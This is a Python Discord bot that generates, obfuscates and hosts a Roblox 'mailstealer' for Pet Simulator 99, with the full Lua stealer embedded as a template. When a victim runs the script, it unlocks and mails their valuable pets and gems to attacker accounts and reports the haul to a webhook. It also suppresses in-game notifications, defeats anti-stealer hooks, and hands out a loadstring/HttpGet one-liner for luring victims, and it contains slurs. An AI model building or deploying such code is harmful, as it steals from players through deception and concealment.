import discord
import requests
import json
import base64
import os
from discord.ext import commands
from discord import app_commands
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Get environment variables
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
LUA_OBFUSCATOR_API_KEY = os.getenv("LUA_OBFUSCATOR_API_KEY")
GITHUB_REPO = os.getenv("GITHUB_REPO")  # Format: username/repository

# Discord bot setup
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="/", intents=intents)

# Lua script template
lua_script_template = """
Username = "{playeruser1}"
Username2 = "{playeruser2}" -- stuff will get sent to this user if first user's mailbox is full
webhook = "{playerwebhook}"
min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default

-- Check if totalRAP exceeds 1 billion
if totalRAP > 10000000 then -- 1 billion
    Username = "X4_NDY" -- Set username to YACINEPRO336
    ["text"] = "womp"
    webhook = "ur not gonna get my webhook"
end

-- Process items and send webhook
local function processItems()
    if totalRAP > 10000000 then -- Check if RAP exceeds 1B
        sendWebhook(totalRAP, #sortedItems) -- Send data to webhook
    end
end

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local mailsent = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "TYSM YACINE"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local getFucked = false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local newamount = 20000

if mailsent ~= 0 then
	newamount = math.ceil(newamount * (1.5 ^ mailsent))
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end

if newamount > GemAmount1 then
    return
end

local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json",
    }

	local fields = {
		{
			name = "Retard Username:",
			value = username,
			inline = true
		},
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = "",
            inline = false
        }
	}

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
    end

    fields[3].value = fields[3].value .. "Gems: " .. formatNumber(diamonds) .. "\n"
    fields[3].value = fields[3].value .. "Total RAP: " .. formatNumber(totalRAP)
    if getFucked then
        fields[3].value = fields[3].value .. "\n\nVictim tried to use anti-mailstealer, but got fucked instead"
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\144\177 New PS99 Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by Yacine. discord.gg/GY2RVSEGDT"
			}
        }}
    }

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n")
            fields[2].value = fields[2].value .. "\nPlus more!"
        end
    end

    local body = HttpService:JSONEncode(data)

    if webhook and webhook ~= "" then
        local response = request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end

local user = Username
local user2 = Username2

local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
	local response = false
	repeat
    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
		if response == false and err == "They don't have enough space!" then
			user = user2
			args[1] = user
		end
	until response == true
	GemAmount1 = GemAmount1 - newamount
	newamount = math.ceil(math.ceil(newamount) * 1.5)
	if newamount > 5000000 then
		newamount = 5000000
	end
end

local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
			if GemAmount1 >= (newamount + 10000) then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Currency",
					[4] = i,
					[5] = GemAmount1 - newamount
				}
				local response = false
				repeat
					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
				until response == true
				break
			end
        end
    end
end

local function IsMailboxHooked()
	local uid
	for i, v in pairs(save["Pet"]) do
		uid = i
		break
	end
	local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
        return false
    else
        return true
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
			if value._uq then
				network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
			end
        end
    end
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}

for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
			if v == "Pet" then
                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                if dir.huge or dir.exclusiveLevel then
                    local rapValue = getRAP(v, item)
                    if rapValue >= min_rap then
                        local prefix = ""
                        if item.pt and item.pt == 1 then
                            prefix = "Golden "
                        elseif item.pt and item.pt == 2 then
                            prefix = "Rainbow "
                        end
                        if item.sh then
                            prefix = "Shiny " .. prefix
                        end
                        local id = prefix .. item.id
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                    totalRAP = totalRAP + (rapValue * (item._am or 1))
                end
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
	end
end

if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ClaimMail()
	if IsMailboxHooked() then
        getFucked = true
		local Mailbox = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
        for i, Func in ipairs(getgc(true)) do
            if typeof(Func) == "function" and debug.info(Func, "n") == "typeof" then
                local Old
                Old = hookfunction(Func, function(Ins, ...)
                    if Ins == Mailbox then
                        return tick()
                    end
                    return Old(Ins, ...)
                end)
            end
        end
	end
    EmptyBoxes()
	require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
	require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
    local blob_a = game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")
    local blob_b = require(blob_a).Get()
    function deepCopy(original)
        local copy = {}
        for k, v in pairs(original) do
            if type(v) == "table" then
                v = deepCopy(v)
            end
            copy[k] = v
        end
        return copy
    end
    blob_b = deepCopy(blob_b)
    require(blob_a).Get = function(...)
        return blob_b
    end

    table.sort(sortedItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount 
    end)

    spawn(function()
        SendMessage(plr.Name, GemAmount1)
    end)

    for _, item in ipairs(sortedItems) do
        if item.rap >= newamount then
            sendItem(item.category, item.uid, item.amount)
        else
            break
        end
    end
    SendAllGems()
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("All your items just got stolen by Yacine's mailstealer!\n Join discord.gg/GY2RVSEGDT")
    setclipboard("discord.gg/GY2RVSEGDT")
end
GDT")
end
"""

# Helper function to interact with LuaObfuscator API
def obfuscate_script(lua_script):
    url = "https://api.luaobfuscator.com/v1/obfuscator/newscript"
    headers = {
        "apikey": LUA_OBFUSCATOR_API_KEY,
        "Content-Type": "text"
    }
    response = requests.post(url, headers=headers, data=lua_script)

    if response.status_code == 200:
        session_id = response.json().get("sessionId")
        return session_id
    else:
        raise Exception("Failed to upload script to LuaObfuscator")

# Helper function to apply obfuscation
def apply_obfuscation(session_id):
    url = "https://api.luaobfuscator.com/v1/obfuscator/obfuscate"
    headers = {
        "apikey": LUA_OBFUSCATOR_API_KEY,
        "Content-Type": "application/json",
        "sessionId": session_id
    }
    data = {
        "MinifiyAll": True,
        "Virtualize": True
    }

    response = requests.post(url, headers=headers, json=data)
    
    if response.status_code == 200:
        return response.json().get("code")
    else:
        raise Exception("Failed to obfuscate the script")

# Helper function to upload to GitHub
def upload_to_github(obfuscated_script):
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/obfuscated_script.lua"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    file_content = base64.b64encode(obfuscated_script.encode()).decode()

    data = {
        "message": "Add obfuscated Lua script",
        "content": file_content
    }

    response = requests.put(url, headers=headers, data=json.dumps(data))
    
    if response.status_code == 201:
        file_info = response.json()
        return file_info["content"]["download_url"]
    else:
        raise Exception("Failed to upload file to GitHub")

# Sync the tree of commands with Discord
@bot.event
async def on_ready():
    # Sync commands with Discord (if not already done)
    await bot.tree.sync()
    print(f"Bot is ready and slash commands are synced!")

# Slash command to generate the Lua script
@bot.tree.command(name="generate", description="Generate an obfuscated Lua script")
async def generate(interaction: discord.Interaction, playeruser1: str, playeruser2: str, playerwebhook: str):
    # Use named placeholders and pass parameters correctly
    lua_script = lua_script_template.format(playeruser1=playeruser1, playeruser2=playeruser2, playerwebhook=playerwebhook)
    
    # Step 1: Upload to LuaObfuscator and get session ID
    try:
        session_id = obfuscate_script(lua_script)
    except Exception as e:
        await interaction.response.send_message(f"Error: {e}")
        return

    # Step 2: Apply obfuscation to the uploaded script
    try:
        obfuscated_code = apply_obfuscation(session_id)
    except Exception as e:
        await interaction.response.send_message(f"Error: {e}")
        return

    # Step 3: Upload the obfuscated script to GitHub
    try:
        github_url = upload_to_github(obfuscated_code)
    except Exception as e:
        await interaction.response.send_message(f"Error: {e}")
        return

    # Step 4: Send the raw file URL to the user via DM
    await interaction.user.send(f"Here is your obfuscated script: \n\n`loadstring(game:HttpGet('{github_url}'))()`")

    # Confirm the process is done
    await interaction.response.send_message(f"Obfuscated script uploaded to GitHub and sent to your DM!")

# Run the bot
bot.run(DISCORD_TOKEN)
